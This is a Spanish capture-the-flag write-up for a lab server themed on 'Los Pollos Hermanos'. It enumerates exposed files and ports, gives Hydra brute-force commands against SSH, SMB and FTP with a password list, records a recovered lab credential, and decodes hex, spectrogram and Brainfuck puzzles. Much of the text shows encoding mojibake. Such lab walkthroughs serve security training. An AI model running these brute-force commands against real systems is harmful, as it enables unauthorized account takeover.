href="http://192.168.1.44/archivos/">http://192.168.1.44/archivos/</a></p>
<p>Esta url contiene lo que parecen ser los archivos multimedia de la
web y algÃºn archivo mÃ¡s:</p>
<p><img src="cookbook/media/image24.png"
style="width:2.92795in;height:3.03503in" /></p>
<p>Listado de archivos:</p>
<table style="width:100%;">
<colgroup>
<col style="width: 8%" />
<col style="width: 37%" />
<col style="width: 38%" />
<col style="width: 12%" />
<col style="width: 2%" />
</colgroup>
<thead>
<tr>
<th><img src="cookbook/media/image25.gif"
style="width:0.20833in;height:0.22917in" alt="[SND]" /></th>
<th><a
href="http://192.168.1.44/archivos/Bienvenidos.mp3"><u>Bienvenidos.mp3</u></a></th>
<th style="text-align: right;">2025-07-17 16:13</th>
<th style="text-align: right;">101K</th>
<th>Â </th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="cookbook/media/image26.gif"
style="width:0.20833in;height:0.22917in" alt="[ ]" /></td>
<td><a
href="http://192.168.1.44/archivos/PAN.rar"><u>PAN.rar</u></a></td>
<td style="text-align: right;">2025-07-21 11:12</td>
<td style="text-align: right;">200</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/PIN.png"><u>PIN.png</u></a></td>
<td style="text-align: right;">2025-07-20 18:46</td>
<td style="text-align: right;">2.9M</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image26.gif"
style="width:0.20833in;height:0.22917in" alt="[ ]" /></td>
<td><a
href="http://192.168.1.44/archivos/algo.rar"><u>algo.rar</u></a></td>
<td style="text-align: right;">2025-07-21 11:40</td>
<td style="text-align: right;">270</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/cupon1.png"><u>cupon1.png</u></a></td>
<td style="text-align: right;">2025-07-16 16:50</td>
<td style="text-align: right;">363K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/cupon2.png"><u>cupon2.png</u></a></td>
<td style="text-align: right;">2025-07-16 16:49</td>
<td style="text-align: right;">441K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/cupon3.png"><u>cupon3.png</u></a></td>
<td style="text-align: right;">2025-07-16 16:52</td>
<td style="text-align: right;">357K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/desaparecida.jpg"><u>desaparecida.jpg</u></a></td>
<td style="text-align: right;">2025-07-20 18:01</td>
<td style="text-align: right;">19K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/horario.jpg"><u>horario.jpg</u></a></td>
<td style="text-align: right;">2025-07-18 10:36</td>
<td style="text-align: right;">216K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image26.gif"
style="width:0.20833in;height:0.22917in" alt="[ ]" /></td>
<td><a
href="http://192.168.1.44/archivos/http_jpeg.pcapng"><u>http_jpeg.pcapng</u></a></td>
<td style="text-align: right;">2025-07-19 10:00</td>
<td style="text-align: right;">504K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image25.gif"
style="width:0.20833in;height:0.22917in" alt="[SND]" /></td>
<td><a
href="http://192.168.1.44/archivos/llamada.wav"><u>llamada.wav</u></a></td>
<td style="text-align: right;">2025-07-20 08:49</td>
<td style="text-align: right;">405K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/logo.png"><u>logo.png</u></a></td>
<td style="text-align: right;">2025-07-15 11:27</td>
<td style="text-align: right;">77K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu1.jpg"><u>menu1.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 09:38</td>
<td style="text-align: right;">167K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu2.jpg"><u>menu2.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 09:30</td>
<td style="text-align: right;">259K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu3.jpg"><u>menu3.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 09:28</td>
<td style="text-align: right;">493K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu4.jpg"><u>menu4.jpg</u></a></td>
<td style="text-align: right;">2025-07-15 11:26</td>
<td style="text-align: right;">13K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu5.jpg"><u>menu5.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 12:19</td>
<td style="text-align: right;">206K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu6.jpg"><u>menu6.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 12:20</td>
<td style="text-align: right;">101K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu7.jpg"><u>menu7.jpg</u></a></td>
<td style="text-align: right;">2025-07-15 11:25</td>
<td style="text-align: right;">15K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu8.jpg"><u>menu8.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 15:38</td>
<td style="text-align: right;">108K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menuQR.png"><u>menuQR.png</u></a></td>
<td style="text-align: right;">2025-07-18 15:31</td>
<td style="text-align: right;">53K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/nosotros.png"><u>nosotros.png</u></a></td>
<td style="text-align: right;">2025-07-15 11:26</td>
<td style="text-align: right;">402K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image28.gif"
style="width:0.20833in;height:0.22917in" alt="[TXT]" /></td>
<td><a
href="http://192.168.1.44/archivos/passwords.txt"><u>passwords.txt</u></a></td>
<td style="text-align: right;">2025-08-12 10:12</td>
<td style="text-align: right;">2.4K</td>
<td>Â </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/welcome.jpg"><u>welcome.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 12:46</td>
<td style="text-align: right;">1.5M</td>
<td>Â </td>
</tr>
</tbody>
</table>
<p>El archivo passwords.txt contiene cientos de passwords,puede resultar
interesanteâ€¦</p>
<p>El resto de urls que podemos encontrar al desplazarnos por la web
son:</p>
<p><a
href="http://192.168.1.44/index.html">http://192.168.1.44/index.html</a></p>
<p><a
href="http://192.168.1.44/menu.html">http://192.168.1.44/menu.html</a></p>
<p><a
href="http://192.168.1.44/localizacion.html">http://192.168.1.44/localizacion.html</a></p>
<p><a
href="http://192.168.1.44/nosotros.html">http://192.168.1.44/nosotros.html</a></p>
<p><a
href="http://192.168.1.44/privado.html">http://192.168.1.44/privado.html</a></p>
<p><a
href="http://192.168.1.44/cupones.html">http://192.168.1.44/cupones.html</a></p>
<p><a
href="http://192.168.1.44/banderas.php">http://192.168.1.44/banderas.php</a></p>
<p><a
href="http://192.168.1.44/moscas.php">http://192.168.1.44/moscas.php</a></p>
<p><img src="cookbook/media/image29.png"
style="width:2.86837in;height:1.43216in" /> <img
src="cookbook/media/image30.png"
style="width:2.85192in;height:1.41623in" /></p>
<p><img src="cookbook/media/image31.png"
style="width:2.84161in;height:1.41646in" /> <img
src="cookbook/media/image32.png"
style="width:2.84893in;height:1.41475in" /></p>
<p><img src="cookbook/media/image33.png"
style="width:2.85518in;height:1.41114in" /> <img
src="cookbook/media/image34.png"
style="width:2.82807in;height:1.3871in" /></p>
<p><img src="cookbook/media/image35.png"
style="width:2.8824in;height:1.41612in" /> <img
src="cookbook/media/image36.png"
style="width:2.8146in;height:1.39439in" /></p>
<p><strong>ContraseÃ±as</strong></p>
<p>Ya tenemos una lista de usuarios y un diccionario de contraseÃ±as
(passwords.txt), podemos usar <strong>Hydra</strong> para hacer ataque
de fuerza bruta contra un servicio.</p>
<p><img src="cookbook/media/image37.png"
style="width:5.63542in;height:2.83333in" /></p>
<p><img src="cookbook/media/image38.png"
style="width:4.83333in;height:5.05208in" /></p>
<p><strong>1ï¸âƒ£ Si quieres probar contra SSH (puerto 22):</strong></p>
<p>hydra -L /home/kali/usuarios.txt -P /home/kali/passwords.txt
ssh://192.168.1.44</p>
<p>-L usuarios.txt â†’ Lista de usuarios.</p>
<p>-P /home/kali/passwords.txt â†’ Lista de contraseÃ±as.</p>
<p>ssh://IP â†’ Servicio y objetivo.</p>
<p><img src="cookbook/media/image39.png"
style="width:5.90556in;height:0.66667in" /></p>
<p><img src="cookbook/media/image40.png"
style="width:5.90556in;height:2.72222in" /></p>
<p><strong>2ï¸âƒ£ Si quieres probar contra SMB (puertos
139/445):</strong></p>
<p>hydra -L /home/kali/usuarios.txt -P /home/kali/passwords.txt
smb://192.168.1.44</p>
<p><em>(En versiones antiguas de Hydra, SMB se llama smb o
smbnt)</em></p>
<p><strong>3ï¸âƒ£ Si quieres probar contra FTP (puerto 21):</strong></p>
<p>hydra -L /home/kali/usuarios.txt -P /home/kali/passwords.txt
ftp://192.168.1.44</p>
<p>ğŸ’¡ <strong>Consejos CTF</strong>:</p>
<ul>
<li><p>Empieza probando en <strong>FTP</strong> o <strong>SMB</strong>
antes que en SSH: suelen tener contraseÃ±as dÃ©biles y menos
restricciones.</p></li>
<li><p>Si alguna combinaciÃ³n usuario/contraseÃ±a funciona, apÃºntala y
pruÃ©bala en todos los servicios.</p></li>
</ul>
<p><strong>ğŸ“ Resumen de la informaciÃ³n obtenida:</strong></p>
<p><strong>IP:</strong> 192.168.1.44</p>
<p><strong>S.O.:</strong> Ubuntu Server</p>
<p><strong>Hostname:</strong> lospollos</p>
<p><strong>Servidor:</strong> Apache</p>
<p><strong>Puertos:</strong></p>
<ul>
<li><p>21/tcp open ftp (Anonymous login allowed)</p></li>
<li><p>22/tcp open ssh OpenSSH Ubuntu</p></li>
<li><p>80/tcp open http Apache</p></li>
<li><p>139/tcp open Samba smb</p></li>
<li><p>445/tcp open Samba smb</p></li>
<li><p>31337/tcp closed Elite?</p></li>
</ul>
<p><strong>Usuarios:</strong></p>
<ul>
<li><p>fring</p></li>
<li><p>chow</p></li>
<li><p>hector</p></li>
<li><p>mike</p></li>
<li><p>lydia</p></li>
<li><p>victor</p></li>
<li><p>tyrus</p></li>
<li><p>saul</p></li>
</ul>
<p><strong>ContraseÃ±as:</strong></p>
<p>Chow: Ch0w$up1</p>
<p><strong>URLs:</strong></p>
<p>http-title: Los Pollos Hermanos</p>
<p><a
href="http://192.168.1.44/archivos">http://192.168.1.44/archivos</a>
(directorio listable)</p>
<p><a
href="http://192.168.1.44/index.html">http://192.168.1.44/index.html</a></p>
<p><a
href="http://192.168.1.44/server-status">http://192.168.1.44/server-status</a></p>
<p><a
href="http://192.168.1.44/ver.php">http://192.168.1.44/ver.php</a></p>
<p><a
href="http://192.168.1.44/menu.html">http://192.168.1.44/menu.html</a></p>
<p><a
href="http://192.168.1.44/localizacion.html">http://192.168.1.44/localizacion.html</a></p>
<p><a
href="http://192.168.1.44/nosotros.html">http://192.168.1.44/nosotros.html</a></p>
<p><a
href="http://192.168.1.44/privado.html">http://192.168.1.44/privado.html</a></p>
<p><a
href="http://192.168.1.44/cupones.html">http://192.168.1.44/cupones.html</a></p>
<p><a
href="http://192.168.1.44/banderas.php">http://192.168.1.44/banderas.php</a></p>
<p><a
href="http://192.168.1.44/moscas.php">http://192.168.1.44/moscas.php</a></p>
<h1 id="section"></h1>
<h1 id="section-1"></h1>
<h1 id="resoluciÃ³n-de-moscas"><strong>ResoluciÃ³n de Moscas</strong></h1>
<h1 id="section-2"></h1>
<p><img src="cookbook/media/image41.jpeg"
style="width:5.90556in;height:3.37431in" /></p>
<p><strong><br />
</strong></p>
<h1 id="mosca-1-verificaciÃ³n-web-inicial"><strong>ğŸ Mosca 1 â€“
VerificaciÃ³n Web Inicial</strong></h1>
<p><strong>CategorÃ­a:</strong> CriptografÃ­a/SteganografÃ­a<br />
<strong>Nivel:</strong> BÃ¡sico-Intermedio<br />
<strong>Objetivo:</strong> Encontrar el valor correcto de la Mosca 1 y
enviarlo al sistema para que quede registrada como atrapada.</p>
<p><span id="_Toc207189803" class="anchor"></span><strong>ğŸ§  DescripciÃ³n
del reto</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina index.html vemos un comentario que
dice:</p>
<p><img src="cookbook/media/image42.png"
style="width:5.90556in;height:0.34028in" /></p>
<p><span id="_Toc207189804" class="anchor"></span><strong>ğŸ§°
Herramientas necesarias</strong></p>
<ul>
<li><p>Navegador web (Firefox o Chromium en Kali Linux)</p></li>
<li><p>Inspectores de cÃ³digo fuente HTML/JS (DevTools)</p></li>
<li><p>Terminal con herramientas como curl</p></li>
<li><p>Opcional: Burp Suite si deseas interceptar la peticiÃ³n
POST</p></li>
</ul>
<p><span id="_Toc207189805" class="anchor"></span><strong>ğŸ¾ Paso a paso
de resoluciÃ³n</strong></p>
<p><strong>1ï¸âƒ£ Acceder a la pÃ¡gina del reto</strong></p>
<p>firefox http://192.168.1.44/index.html</p>
<p>La pÃ¡gina principal de la web Los Pollos Hermanos es mostrada.</p>
<p><strong>2ï¸âƒ£ Inspeccionar cÃ³digo fuente</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina index.html vemos un comentario que
dice:</p>
<p>&lt;!â€” ğŸ”</p>
<p>45 6C 5F 61 75 64 69 6F 5F 42 69 65 6E 76 65 6E 69 64 6F 73 5F 65 73
63 6F 6E 64 65 5F 6C 61 5F 6D 6F 73 63 61 5F 31</p>
<p>--&gt;</p>
<p>Este cÃ³digo delata que es hexadecimal por varias razones claras:</p>
<p>ğŸ” <strong>1. Rango de caracteres</strong></p>
<p>Cada grupo estÃ¡ compuesto exclusivamente por dos caracteres que son
vÃ¡lidos en el sistema hexadecimal:</p>
<ul>
<li><p>Los caracteres hexadecimales vÃ¡lidos son: 0-9 y A-F (o
a-f).</p></li>
<li><p>Todos los bytes en tu cadena cumplen esta regla.</p></li>
</ul>
<p>Por ejemplo: 45, 6C, 5F, etc., estÃ¡n dentro del rango hexadecimal (00
a FF).</p>
<p>ğŸ” <strong>2. Formato tÃ­pico de codificaciÃ³n hexadecimal</strong></p>
<p>EstÃ¡ estructurada en pares de dos dÃ­gitos, lo que es tÃ­pico de la
representaciÃ³n en hexadecimal de bytes (cada byte = 2 dÃ­gitos hex).</p>
<p>Este formato se usa mucho en codificaciÃ³n de strings, datos binarios,
archivos, redes, etc.</p>
<p><strong>3ï¸âƒ£ ConversiÃ³n a binario</strong></p>
<p>Cada dÃ­gito hexadecimal se convierte en un grupo de cuatro bits
binarios (un nibble).</p>
<p>â€¢ 45 = 0100 0101</p>
<p>â€¢ 6C = 0110 1100</p>
<p>â€¢ 5F = 0101 1111</p>
<p>â€¢ 61 = 0110 0001</p>
<p>â€¢ 75 = 0111 0101</p>
<p>â€¢ 64 = 0110 0100</p>
<p>â€¢ 69 = 0110 1001</p>
<p>â€¢ 6F = 0110 1111</p>
<p>â€¢ 5F = 0101 1111</p>
<p>â€¢ 42 = 0100 0010</p>
<p>â€¢ 69 = 0110 1001</p>
<p>â€¢ 65 = 0110 0101</p>
<p>â€¢ 6E = 0110 1110</p>
<p>â€¢ 76 = 0111 0110</p>
<p>â€¢ 65 = 0110 0101</p>
<p>â€¢ 6E = 0110 1110</p>
<p>â€¢ 69 = 0110 1001</p>
<p>â€¢ 64 = 0110 0100</p>
<p>â€¢ 6F = 0110 1111</p>
<p>â€¢ 73 = 0111 0011</p>
<p>â€¢ 5F = 0101 1111</p>
<p>â€¢ 65 = 0110 0101</p>
<p>â€¢ 73 = 0111 0011</p>
<p>â€¢ 63 = 0110 0011</p>
<p>â€¢ 6F = 0110 1111</p>
<p>â€¢ 6E = 0110 1110</p>
<p>â€¢ 64 = 0110 0100</p>
<p>â€¢ 65 = 0110 0101</p>
<p>â€¢ 5F = 0101 1111</p>
<p>â€¢ 6C = 0110 1100</p>
<p>â€¢ 61 = 0110 0001</p>
<p>â€¢ 5F = 0101 1111</p>
<p>â€¢ 6D = 0110 1101</p>
<p>â€¢ 6F = 0110 1111</p>
<p>â€¢ 73 = 0111 0011</p>
<p>â€¢ 63 = 0110 0011</p>
<p>â€¢ 61 = 0110 0001</p>
<p>â€¢ 5F = 0101 1111</p>
<p>â€¢ 31 = 0011 0001</p>
<p>Al concatenar todos estos grupos de bits, obtenemos la cadena binaria
original:</p>
<p>01000101 01101100 01011111 01100001 01110101 01100100 01101001
01101111 01011111 01000010 01101001 01100101 01101110 01110110 01100101
01101110 01101001 01100100 01101111 01110011 01011111 01100101 01110011
01100011 01101111 01101110 01100100 01100101 01011111 01101100 01100001
01011111 01101101 01101111 01110011 01100011 01100001 01011111
00110001</p>
<p><strong>4ï¸âƒ£ ConversiÃ³n de Binario a Texto Plano</strong></p>
<p><a
href="https://es.convertbinary.com/de-binario-a-texto/">https://es.convertbinary.com/de-binario-a-texto/</a></p>
<p>Ahora, tomaremos cada grupo de ocho bits (un byte) de la cadena
binaria y lo convertiremos a su carÃ¡cter ASCII correspondiente.</p>
<p>â€¢ 01000101 = E</p>
<p>â€¢ 01101100 = l</p>
<p>â€¢ 01011111 = _</p>
<p>â€¢ 01100001 = a</p>
<p>â€¢ 01110101 = u</p>
<p>â€¢ 01100100 = d</p>
<p>â€¢ 01101001 = i</p>
<p>â€¢ 01101111 = o</p>
<p>â€¢ 01011111 = _</p>
<p>â€¢ 01000010 = B</p>
<p>â€¢ 01101001 = i</p>
<p>â€¢ 01100101 = e</p>
<p>â€¢ 01101110 = n</p>
<p>â€¢ 01110110 = v</p>
<p>â€¢ 01100101 = e</p>
<p>â€¢ 01101110 = n</p>
<p>â€¢ 01101001 = i</p>
<p>â€¢ 01100100 = d</p>
<p>â€¢ 01101111 = o</p>
<p>â€¢ 01110011 = s</p>
<p>â€¢ 01011111 = _</p>
<p>â€¢ 01100101 = e</p>
<p>â€¢ 01110011 = s</p>
<p>â€¢ 01100011 = c</p>
<p>â€¢ 01101111 = o</p>
<p>â€¢ 01101110 = n</p>
<p>â€¢ 01100100 = d</p>
<p>â€¢ 01100101 = e</p>
<p>â€¢ 01011111 = _</p>
<p>â€¢ 01101100 = l</p>
<p>â€¢ 01100001 = a</p>
<p>â€¢ 01011111 = _</p>
<p>â€¢ 01101101 = m</p>
<p>â€¢ 01101111 = o</p>
<p>â€¢ 01110011 = s</p>
<p>â€¢ 01100011 = c</p>
<p>â€¢ 01100001 = a</p>
<p>â€¢ 01011111 = _</p>
<p>â€¢ 00110001 = 1</p>
<p><strong>5ï¸âƒ£ Mensaje Final en Texto Plano</strong></p>
<p>Al juntar todos los caracteres ASCII, obtenemos el mensaje
original:</p>
<p>El_audio_Bienvenidos_esconde_la_mosca_1</p>
<p>Ahora tendremos que descargar el archivo de audio para poder
inspeccionarlo.</p>
<p>Para verla hay que abrir el archivo Bienvenidos.mp3 que se encuentra
en la carpeta â€archivosâ€ con Audacity y ver el Espectograma. Se aprecia
la palabra â€œHEISENBERGâ€.</p>
<p><img src="cookbook/media/image43.png"
style="width:5.90556in;height:2.11806in" /></p>
<p><span id="_Toc207189806" class="anchor"></span><strong>ğŸ›¡ï¸ Notas
tÃ©cnicas</strong></p>
<p><strong>ğŸ”¹ OcultaciÃ³n de texto en espectrogramas de
audio</strong></p>
<p><strong>1. Â¿QuÃ© es?</strong></p>
<ul>
<li><p>Es una forma de <strong>esteganografÃ­a en
audio</strong>.</p></li>
<li><p>En lugar de modificar directamente el sonido que se oye, se
manipula la representaciÃ³n <strong>frecuencia vs tiempo</strong> del
audio.</p></li>
<li><p>El mensaje (texto o imÃ¡genes) se convierte en un <strong>patrÃ³n
visual</strong> que puede ser visto en el espectrograma, pero no
detectado fÃ¡cilmente al escuchar el audio.</p></li>
</ul>
<p><strong>2. TÃ©cnicas comunes</strong></p>
<ol type="1">
<li><p><strong>InserciÃ³n directa de frecuencias</strong>:</p>
<ul>
<li><p>Se aÃ±aden tonos a frecuencias muy altas (cercanas al lÃ­mite
audible &gt;16 kHz).</p></li>
<li><p>El oÃ­do humano apenas lo percibe, pero en el espectrograma se ven
lÃ­neas o letras.</p></li>
</ul></li>
<li><p><strong>ModulaciÃ³n por amplitud/fase</strong>:</p>
<ul>
<li><p>Se â€œdibujanâ€ formas en el espectrograma alterando la amplitud de
ciertas bandas de frecuencia en momentos especÃ­ficos.</p></li>
<li><p>El resultado es un â€œgraffiti sonoroâ€ visible como texto o
sÃ­mbolos.</p></li>
</ul></li>
<li><p><strong>ConversiÃ³n de texto a imagen y luego a
espectrograma</strong>:</p>
<ul>
<li><p>El texto se renderiza como una imagen.</p></li>
<li><p>Esa imagen se convierte a un espectro de audio mediante
herramientas como <strong>Coagula</strong>, <strong>Sonic
Visualiser</strong> o scripts en Python (ej. usando FFT
inversa).</p></li>
<li><p>Al reproducirlo se escucha ruido extraÃ±o, pero en Audacity
aparece el mensaje.</p></li>
</ul></li>
</ol>
<p><strong>3. CÃ³mo verlo en Audacity</strong></p>
<ol type="1">
<li><p>Abrir el archivo de audio.</p></li>
<li><p>En la pista, clic en el menÃº desplegable â–º
Espectrograma.</p></li>
<li><p>Ajustar parÃ¡metros en â–º ConfiguraciÃ³n del espectrograma:</p>
<ul>
<li><p><strong>Rango de frecuencia</strong>: subir el mÃ¡ximo (ej. hasta
20 kHz).</p></li>
<li><p><strong>ResoluciÃ³n FFT</strong>: aumentar (ej. 4096 o mÃ¡s) para
ver detalles finos.</p></li>
<li><p><strong>Escala logarÃ­tmica</strong>: mÃ¡s natural para leer
formas.</p></li>
</ul></li>
<li><p>Hacer zoom en la zona alta de frecuencias (normalmente donde se
ocultan los mensajes).</p></li>
<li><p>El texto aparecerÃ¡ como <strong>patrones dibujados</strong>
(lÃ­neas, letras, sÃ­mbolos).</p></li>
</ol>
<p><strong>4. Limitaciones</strong></p>
<ul>
<li><p>La ocultaciÃ³n aumenta el <strong>tamaÃ±o del archivo</strong> y
puede distorsionar el audio.</p></li>
<li><p>Si el audio se comprime con pÃ©rdida (ej. MP3), se suelen perder
las frecuencias ocultas.</p></li>
<li><p>Requiere un buen ajuste de parÃ¡metros en Audacity para que el
mensaje sea visible.</p></li>
</ul>
<p><strong>5. Herramientas relacionadas</strong></p>
<ul>
<li><p><strong>Audacity</strong> â†’ Para visualizar
espectrogramas.</p></li>
<li><p><strong>Sonic Visualiser</strong> â†’ MÃ¡s especializado en anÃ¡lisis
de espectrogramas.</p></li>
<li><p><strong>Coagula</strong> â†’ Convierte imÃ¡genes (incluido texto) en
espectrogramas de audio.</p></li>
<li><p><strong>FFmpeg</strong> â†’ Puede generar espectrogramas
directamente con filtros (showspectrumpic).</p></li>
</ul>
<p><span id="_Toc207189807" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p>La <strong>Mosca 1</strong> queda atrapada con el valor
'HEISENBERG'.</p>
<p><mark>Mosca 1 atrapada: 'HEISENBERG'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="mosca-2-esteganografÃ­a-en-metadatos"><strong>ğŸ Mosca 2 â€“
EsteganografÃ­a en Metadatos</strong></h1>
<p><strong>CategorÃ­a:</strong> EsteganografÃ­a / Forense digital<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Objetivo:</strong> Extraer el valor secreto oculto en un archivo
de imagen para capturar la Mosca 2 correctamente.</p>
<p><span id="_Toc207189809" class="anchor"></span><strong>ğŸ› ï¸
Herramientas necesarias</strong></p>
<ul>
<li><p>wget o navegador para descargar el archivo</p></li>
<li><p>file, strings, exiftool para metadatos</p></li>
<li><p>binwalk, zsteg, strings, grep para anÃ¡lisis profundo</p></li>
</ul>
<p><span id="_Toc207189810" class="anchor"></span><strong>ğŸ“ Fase 1 â€“
Descarga y reconocimiento del archivo</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina localizacion.html vemos un
comentario que dice:</p>
<p>&lt;!â€” ğŸ”</p>
<p>++++++++++[&gt;+++++++&gt;+++++++++++&gt;+++&gt;+++++++++++&gt;++++++++++&gt;+++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++&gt;++++++++++&gt;++++++++++&gt;+++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++&gt;++++++++++&gt;+++&gt;+++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++&gt;+++&gt;++++++++++&gt;++++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++++++++++&gt;++++++++++&gt;++++++++++&gt;+++&gt;+++++++++++&gt;++++++++++&gt;+++&gt;++++++++&gt;+++++++++++&gt;++++++++++++&gt;++++++++++&gt;++++++++++&gt;+++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;-.&gt;.&gt;++.&gt;--.&gt;---.&gt;++.&gt;-----.&gt;-.&gt;---.&gt;+++.&gt;+.&gt;.&gt;++.&gt;.&gt;+.&gt;--.&gt;++.&gt;++++.&gt;+.&gt;++++.&gt;---.&gt;++++.&gt;-----.&gt;+.&gt;++.&gt;.&gt;+.&gt;++.&gt;+.&gt;-----.&gt;----.&gt;---.&gt;++.&gt;++.&gt;-----.&gt;+.&gt;+++.&gt;-----.&gt;.&gt;---.&gt;++.&gt;+.&gt;-----.&gt;----.&gt;-----.&gt;+.&gt;++.&gt;+.&gt;-----.&gt;-.&gt;+.&gt;.&gt;.&gt;-----.&gt;.&gt;---.&gt;++.&gt;--.&gt;---.&gt;++.&gt;---.&gt;+.&gt;-----.&gt;-.&gt;---.&gt;++.&gt;.</p>
<p>--&gt;</p>
<p><img src="cookbook/media/image44.png"
style="width:5.90556in;height:0.26458in" /></p>
<p>La cadena es un cÃ³digo en el lenguaje de programaciÃ³n Brainfuck, y se
puede identificar por varias caracterÃ­sticas muy concretas:</p>
<p><strong>1. âœ… Solo usa 8 sÃ­mbolos vÃ¡lidos</strong></p>
<p>Brainfuck Ãºnicamente utiliza los siguientes 8 caracteres como
instrucciones:</p>
<p>&gt; &lt; + - [ ] . ,</p>
<p>El cÃ³digo contiene exclusivamente estos sÃ­mbolos (entre mÃ¡s de 700
caracteres), lo cual es la pista mÃ¡s evidente de que pertenece a
Brainfuck.</p>
<p><strong>2. âœ… Uso intensivo de bucles con [ y ]</strong></p>
<p>La secuencia ++++++++++[ al inicio es un patrÃ³n clÃ¡sico en Brainfuck
para iniciar un bucle que sirve como multiplicador o generador de valor
base.</p>
<p>Los bucles [ y ] son usados para iterar mientras el valor actual del
puntero no sea 0, tÃ­pico de bucles de inicializaciÃ³n en este
lenguaje.</p>
<p><strong>3. âœ… Patrones comunes de inicializaciÃ³n y escritura de
texto</strong></p>
<p>El inicio:</p>
<p>++++++++++[&gt;+++++++&gt;+++++++++++&gt;+++...</p>
<p>Es un patrÃ³n conocido para precargar celdas de memoria con valores
especÃ­ficos antes de imprimir texto.</p>
